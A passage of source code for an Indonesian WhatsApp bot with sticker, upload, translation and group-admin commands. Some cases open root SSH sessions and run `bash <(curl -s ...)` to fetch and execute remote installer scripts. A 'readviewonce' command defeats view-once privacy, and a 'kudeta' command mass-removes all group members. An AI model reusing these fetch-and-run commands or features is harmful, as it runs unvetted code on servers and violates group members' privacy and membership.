    if (data.status && data.result) {
      Reply(`*🤖 Nvidia-Ai:*\n\n${data.result}`);
    } else {
      Reply("❌ Gagal mendapatkan jawaban dari API.");
    }
  } catch (err) {
    console.error(err);
    Reply("❌ Terjadi kesalahan internal saat menghubungi AI.");
  }
}
break

case "brat": case "bratvid": {
if (!text) return m.reply(`Example: *.${command}* teksnya`); 
let type = 'image'
if (/bratvid/.test(command)) type = 'animated'
const media = `https://fastrestapis.fasturl.cloud/maker/brat/animated?text=${text}&mode=${type}`
await Nvidia.sendAsSticker(m.chat, media, m, {packname: "Selfbot-v1"})
}
break

case "qc": {
if (!text) return m.reply(example('text'))
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
var ppuser
try {
ppuser = await Nvidia.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": "#000000",
  "width": 812,
  "height": 968,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = "./library/database/sampah/"+m.sender+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return m.reply("Error")
await Nvidia.sendAsSticker(m.chat, tempnya, m, {packname: global.packname})
await fs.unlinkSync(`${tempnya}`)
})
})
}
break

case "s": case "sticker": case "stiker": {
if (!/image|video/gi.test(mime)) return m.reply(example("dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await Nvidia.downloadAndSaveMediaMessage(qmsg)
await Nvidia.sendAsSticker(m.chat, image, m, {packname: global.packname})
await fs.unlinkSync(image)
}
break

case "swm": case "stickerwm": case "stikerwm": case "wm": {
if (!text) return m.reply(example("namamu dengan kirim media"))
if (!/image|video/gi.test(mime)) return m.reply(example("namamu dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await Nvidia.downloadAndSaveMediaMessage(qmsg)
await Nvidia.sendAsSticker(m.chat, image, m, {packname: text})
await fs.unlinkSync(image)
}
break

const Jimp = require("jimp");
const { spawn } = require('child_process');

case "rvo": case "readviewonce": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!m.quoted) return m.reply(example("dengan reply pesannya"))
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return Nvidia.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return Nvidia.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return Nvidia.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break

case "tourl": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let media = await Nvidia.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'fr3hosting.png');

let teks = directLink.toString()
await Nvidia.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break;

case "tourl2": {
  if (!m.quoted && !m.mimetype) return m.reply(example("dengan reply file media (foto/video/audio/file)"));

  // Download media
  let media = m.quoted ? await m.quoted.download() : await m.download();
  if (!media) return m.reply("Gagal mendownload media.");

  // Fungsi upload ke catbox
  async function dt(buffer) {
    const fetchModule = await import('node-fetch');
    const fetch = fetchModule.default;
    const FormData = (await import('form-data')).default;
    const { ext } = await fromBuffer(buffer);

    let bodyForm = new FormData();
    bodyForm.append("fileToUpload", buffer, "file." + ext);
    bodyForm.append("reqtype", "fileupload");

    let res = await fetch("https://catbox.moe/user/api.php", {
      method: "POST",
      body: bodyForm,
    });

    let data = await res.text();
    return data;
  }

  try {
    let result = await dt(media);
    await Nvidia.sendMessage(m.chat, {
      text: `*Url :* ${result}\n*Expired :* Permanen`
    }, { quoted: m });
  } catch (e) {
    m.reply("Gagal mengupload file ke server.");
    console.error(e);
  }
}
break;

case "tr":
case "translate": {
    if (!text) return m.reply("⚠️ Masukkan teks yang ingin diterjemahkan!\n\nContoh: `.tr Halo, apa kabar?`");

    let languages = {
        "🇺🇸 English": "en",
        "🇮🇩 Indonesian": "id",
        "🇯🇵 Japanese": "ja",
        "🇰🇷 Korean": "ko",
        "🇨🇳 Chinese": "zh",
        "🇪🇸 Spanish": "es",
        "🇫🇷 French": "fr",
        "🇩🇪 German": "de",
        "🇷🇺 Russian": "ru",
        "🇮🇹 Italian": "it",
        "🇳🇱 Dutch": "nl"
    };

    let sections = [{
        title: "🌍 Pilih Bahasa Tujuan",
        highlight_label: "Klik untuk menerjemahkan",
        rows: Object.keys(languages).map(lang => ({
            title: lang,
            id: `.trlang ${languages[lang]} ${encodeURIComponent(text)}`
        }))
    }];

    let pesan = `📖 *Fitur Terjemahan*\n\n` +
                `📝 *Teks:* ${text}\n\n` +
                `🌍 Pilih bahasa tujuan dari daftar berikut:\n` +
                `⚡ Klik tombol di bawah! 👇`;

    await Nvidia.sendMessage(m.chat, {
        buttons: [{
            buttonId: 'translate-action',
            buttonText: { displayText: '🌍 Pilih Bahasa' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({ title: "Pilih Bahasa", sections })
            }
        }],
        footer: `🔠 Translate Bot | 🇮🇩 Nvidia`,
        headerType: 1,
        viewOnce: true,
        text: pesan,
    }, { quoted: m });

}
break;

case "tohd": 
case "hd": {
    // Validasi gambar
    if (!m.quoted || !/image/.test(m.quoted.mimetype)) {
        return m.reply("Balas gambar yang ingin diperjelas HD.");
    }

    // Unduh media
    let media = await downloadMediaMessage(m.quoted);
    let inputFile = "./tmp/input.jpg";
    let outputFile = "./tmp/output.jpg";

    // Pastikan folder tmp ada
    if (!fs.existsSync("./tmp")) fs.mkdirSync("./tmp");

    // Simpan gambar ke file
    fs.writeFileSync(inputFile, media);

    m.reply("🔄 Memproses gambar HD, mohon tunggu...");

    // Panggil realesrgan-ncnn-vulkan
    execFile(
        "./realesrgan-ncnn-vulkan", // sesuaikan path binary
        ["-i", inputFile, "-o", outputFile],
        (err, stdout, stderr) => {
            if (err) {
                console.error(stderr);
                return m.reply("❌ Terjadi kesalahan saat memproses gambar HD.");
            }

            // Baca hasilnya
            let hasil = fs.readFileSync(outputFile);
            conn.sendFile(m.chat, hasil, "hd.jpg", "✅ Ini hasil HD-nya!", m);

            // Bersihkan file sementara
            fs.unlinkSync(inputFile);
            fs.unlinkSync(outputFile);
        }
    );
}
break;

case "add": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text) {
const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await Nvidia.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await Nvidia.groupParticipantsUpdate(m.chat, [input], 'add')
if (Object.keys(res).length == 0) {
return m.reply(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
} else {
return m.reply(JSON.stringify(res, null, 2))
}} else {
return m.reply(example("62838###"))
}
}
break

case "kick": case "kik": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await Nvidia.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await Nvidia.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return m.reply(example("@tag/reply"))
}
}
break

case "kick2":
case "kik2": {
  if (!m.isGroup) return Reply(mess.group)
  if (!isCreator && !m.isAdmin) return Reply(mess.admin)
  if (!m.isBotAdmin) return Reply(mess.botAdmin)

  let groupMetadata = await Nvidia.groupMetadata(m.chat)
  let members = groupMetadata.participants.filter(p => p.id !== botNumber)

  if (members.length < 1) return m.reply("❌ Tidak ada anggota yang bisa dikick.")

  // Buat sections nativeFlowInfo
  let sections = [
    {
      title: "👥 DAFTAR ANGGOTA GRUP",
      highlight_label: "🗑️ Kick Member",
      rows: members.map(p => {
        let name = p.notify || p.id.split("@")[0]
        let number = p.id.split("@")[0]
        return {
          title: `👤 ${name}`,
          description: `Nomor: ${number}`,
          id: `.kick20 ${number}`
        }
      })
    }
  ]

  let pesan = `╭─── 〔 *💥 KICK MENU* 〕 ───╮
👥 *Total Member:* ${members.length}

🔹 Pilih anggota yang ingin Anda keluarkan dari grup ini.
⚠️ *Pastikan berhati-hati!* ⚡ Klik tombol di bawah! 👇
╰────────────────────────╯`

  await Nvidia.sendMessage(m.chat, {
    buttons: [
      {
        buttonId: 'pilih-kick-member',
        buttonText: { displayText: '🗑️ Lihat Daftar' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: "🗑️ Pilih Member untuk Kick",
            sections
          })
        }
      }
    ],
    footer: `📌 Bot By ${botname} | ⚡ Developer: FR3`,
    headerType: 1,
    viewOnce: true,
    text: pesan
  }, { quoted: m })
}
break

case "kick20": {
  if (!m.isGroup) return Reply(mess.group)
  if (!isCreator && !m.isAdmin) return Reply(mess.admin)
  if (!m.isBotAdmin) return Reply(mess.botAdmin)
  if (!text) return m.reply("⚠️ Contoh: .kick20 628xxxxxxx")

  const target = text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
  let isRegistered = await Nvidia.onWhatsApp(target.split("@")[0])
  if (isRegistered.length < 1) return m.reply("❌ Nomor tidak terdaftar di WhatsApp.")

  await Nvidia.groupParticipantsUpdate(m.chat, [target], "remove")
  await m.reply(`✅ Berhasil mengeluarkan @${target.split("@")[0]} dari grup ini!`)
}
break

case "leave": case "keluar": {
    if (!isCreator) return Reply(mess.owner);

    let a = await Nvidia.groupFetchAllParticipating();
    let gc = Object.values(a);

    if (gc.length === 0) return Reply("Bot tidak tergabung dalam grup mana pun.");

    let sections = [
        {
            title: "Daftar Grup",
            highlight_label: "Pilih Grup",
            rows: gc.map(group => ({
                title: group.subject,
                description: `Member: ${group.participants.length}`,
                id: `.leavegroup ${group.id}`
            }))
        }
    ];

    let pesan = "Pilih grup yang ingin bot tinggalkan:";

    await Nvidia.sendMessage(m.chat, {
        buttons: [
            {
                buttonId: 'leavegroup-action',
                buttonText: { displayText: 'Pilih Grup' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({ title: "Keluar Grup", sections })
                }
            }
        ],
        footer: `© 2025 ${botname}`,
        headerType: 1,
        viewOnce: true,
        text: pesan,
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"],
        },
    }, { quoted: m });
}
break

case "leavegroup": {
    if (!isCreator) return Reply(mess.owner);
    
    let groupId = text.trim();
    if (!groupId) return Reply("ID grup tidak valid.");

    let a = await Nvidia.groupFetchAllParticipating();
    let gc = Object.values(a).map(g => g.id);

    if (!gc.includes(groupId)) return Reply("Bot tidak berada dalam grup ini.");

    await Reply("Baik, Saya Akan Keluar Dari Grup Ini");
    await sleep(4000);
    await Nvidia.groupLeave(groupId);
}
break;

case "resetlinkgc": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
await Nvidia.groupRevokeInvite(m.chat)
m.reply("Berhasil mereset link grup ✅")
}
break

case "tagall": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await Nvidia.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break

case "linkgc": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await Nvidia.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await Nvidia.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break

case "ht": case "hidetag":  {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let member = m.metadata.participants.map(v => v.id)
await Nvidia.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: m})
}
break

case "joingc": case "join": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("linkgcnya"))
if (!text.includes("chat.whatsapp.com")) return m.reply("Link tautan tidak valid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await Nvidia.groupAcceptInvite(result)
m.reply(`Berhasil bergabung ke dalam grup ${id}`)
}
break

case "get": case "g": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("https://example.com"))
let data = await fetchJson(text)
m.reply(JSON.stringify(data, null, 2))
}
break

case "joinch": case "joinchannel": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await Nvidia.newsletterMetadata("invite", result)
await Nvidia.newsletterFollow(res.id)
m.reply(`
*Berhasil join channel whatsapp ✅*
* Nama channel : *${res.name}*
* Total pengikut : *${res.subscribers + 1}*
`)
}
break

case "on": case "off": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
let gc = Object.keys(db.groups[m.chat])
if (!text || isNaN(text)) {
let teks = "\n*乂 List opstion group settings*\n\n"
await gc.forEach((i, e) => {
teks += `* ${e + 1}. ${capital(i)} : ${db.groups[m.chat][i] ? "_aktif_" : "_tidak aktif_"}\n`
})
teks += `\n Contoh penggunaan *.${command}* 1\n`
return m.reply(teks)
}
const num = Number(text)
let total = gc.length
if (num > total) return
const event = gc[num - 1]
global.db.groups[m.chat][event] = command == "on" ? true : false
return m.reply(`Berhasil *${command == "on" ? "mengaktifkan" : "mematikan"} ${event}* di grup ini`)
}
break

case "autoread": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autoread == true) return m.reply(`*Autoread* sudah aktif!`)
global.db.settings.autoread = true
return m.reply("Berhasil menyalakan *autoread*")
} else if (teks == "off") {
if (global.db.settings.autoread == false) return m.reply(`*Autoread* tidak aktif!`)
global.db.settings.autoread = false
return m.reply("Berhasil mematikan *autoread*")
} else return m.reply(example("on/off"))
}
break

case "autopromosi": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autopromosi == true) return m.reply(`*Autopromosi* sudah aktif!`)
global.db.settings.autopromosi = true
return m.reply("Berhasil menyalakan *autopromosi*")
} else if (teks == "off") {
if (global.db.settings.autopromosi == false) return m.reply(`*Autopromosi* tidak aktif!`)
global.db.settings.autopromosi = false
return m.reply("Berhasil mematikan *autopromosi*")
} else return m.reply(example("on/off"))
}
break

case "autotyping": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autotyping == true) return m.reply(`*Autotyping* sudah aktif!`)
global.db.settings.autotyping = true
return m.reply("Berhasil menyalakan *autotyping*")
} else if (teks == "off") {
if (global.db.settings.autotyping == false) return m.reply(`*Autotyping* tidak aktif!`)
global.db.settings.autotyping = false
return m.reply("Berhasil mematikan *autotyping*")
} else return m.reply(example("on/off"))
}
break

case "autoreadsw": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.readsw == true) return m.reply(`*Autoreadsw* sudah aktif!`)
global.db.settings.readsw = true
return m.reply("Berhasil menyalakan *autoreadsw*")
} else if (teks == "off") {
if (global.db.settings.readsw == false) return m.reply(`*Autoreadsw* tidak aktif!`)
global.db.settings.readsw = false
return m.reply("Berhasil mematikan *autoreadsw*")
} else return m.reply(example("on/off"))
}
break

case "welcome": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].welcome == true) return m.reply(`*Welcome* di grup ini sudah aktif!`)
global.db.groups[m.chat].welcome = true
return m.reply("Berhasil menyalakan *welcome* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].welcome == false) return m.reply(`*Welcome* di grup ini tidak aktif!`)
global.db.groups[m.chat].welcome = false
return m.reply("Berhasil mematikan *welcome* di grup ini")
} else return m.reply(example("on/off"))
}
break

case "antilink": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].antilink == true) return m.reply(`*Antilink* di grup ini sudah aktif!`)
if (global.db.groups[m.chat].antilink2 == true) global.db.groups[m.chat].antilink2 = false
global.db.groups[m.chat].antilink = true
return m.reply("Berhasil menyalakan *antilink* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].antilink == false) return m.reply(`*Antilink* di grup ini tidak aktif!`)
global.db.groups[m.chat].antilink = false
return m.reply("Berhasil mematikan *antilink* di grup ini")
} else return m.reply(example("on/off"))
}
break

case "antilink2": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].antilink2 == true) return m.reply(`*Antilink2* di grup ini sudah aktif!`)
if (global.db.groups[m.chat].antilink == true) global.db.groups[m.chat].antilink = false
global.db.groups[m.chat].antilink2 = true
return m.reply("Berhasil menyalakan *antilink2* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].antilink2 == false) return m.reply(`*Antilink2* di grup ini tidak aktif!`)
global.db.groups[m.chat].antilink2 = false
return m.reply("Berhasil mematikan *antilink2* di grup ini")
} else return m.reply(example("on/off"))
}
break

  case "antipromo": case "antipromosi": {
    if (!m.isGroup) return Reply(mess.group);
    if (!isCreator) return Reply(mess.owner);
    if (!text) return m.reply(example("on/off"));

    let teks = text.toLowerCase();

    if (teks === "on") {
      if (global.db.groups[m.chat].antiPromo === true)
        return m.reply(`*AntiPromo* di grup ini sudah aktif!`);

      if (global.db.groups[m.chat].antiPromo === true)
        global.db.groups[m.chat].antiPromo = false;

      global.db.groups[m.chat].antiPromo = true;
      return m.reply("Berhasil menyalakan *AntiPromo* di grup ini");
    } else if (teks === "off") {
      if (global.db.groups[m.chat].antiPromo === false)
        return m.reply(`*AntiPromo* di grup ini tidak aktif!`);

      global.db.groups[m.chat].antiPromo = false;
      return m.reply("Berhasil mematikan *AntiPromo* di grup ini");
    } else {
      return m.reply(example("on/off"));
    }
  }
break

case "mute": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].mute == true) return m.reply(`*Mute* di grup ini sudah aktif!`)
global.db.groups[m.chat].mute = true
return m.reply("Berhasil menyalakan *mute* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].mute == false) return m.reply(`*Mute* di grup ini tidak aktif!`)
global.db.groups[m.chat].mute = false
return m.reply("Berhasil mematikan *mute* di grup ini")
} else return m.reply(example("on/off"))
}
break

case "blacklist": case "blacklistjpm": case "blgc": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].blacklistjpm == true) return m.reply(`*Blacklistjpm* di grup ini sudah aktif!`)
global.db.groups[m.chat].blacklistjpm = true
return m.reply("Berhasil menyalakan *blacklistjpm* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].blacklistjpm == false) return m.reply(`*Blacklistjpm* di grup ini tidak aktif!`)
global.db.groups[m.chat].blacklistjpm = false
return m.reply("Berhasil mematikan *blacklistjpm* di grup ini")
} else return m.reply(example("on/off"))
}
break

case "closegc": case "close": 
case "opengc": case "open": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (/open|opengc/.test(command)) {
if (m.metadata.announce == false) return 
await Nvidia.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await Nvidia.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break

case "kudetagc": case "kudeta": {
if (!isCreator) return Reply(mess.owner)
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return m.reply("Grup Ini Sudah Tidak Ada Member!")
await m.reply("Kudeta Grup By FR3 Starting 🔥")
for (let i of memberFilter) {
await Nvidia.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await m.reply("Kudeta Grup Telah Berhasil 🏴‍☠️")
}
break

case "demote":
case "promote": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await Nvidia.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await Nvidia.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return m.reply(example("@tag/6285###"))
}
}
break

case "uninstalltema": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await m.reply("Memproses *uninstall* tema pterodactyl\nTunggu 1-10 menit hingga proses selsai")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil *uninstall* tema pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`2\n`)
stream.write(`y\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "installtemastellar": case "installtemastelar": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *tema stellar* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema stellar* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`1\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "installtemabilling": case "instaltemabiling": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema billing* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema billing* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`2\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "installtemaenigma": 
case "instaltemaenigma": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema enigma* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`); // Key Token : skyzodev
stream.write('1\n');
stream.write('3\n');
stream.write('https://wa.me/62882008771\n');
stream.write('https://whatsapp.com/channel/0029VaYoztA47XeAhs447Y1s\n');
stream.write('https://chat.whatsapp.com/IP1KjO4OyM97ay2iEsSAFy\n');
stream.write('yes\n');
stream.write('x\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break;

case "installtemanebula": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *thema Nebula* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema nebula* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write('2\n');
stream.write('\n');
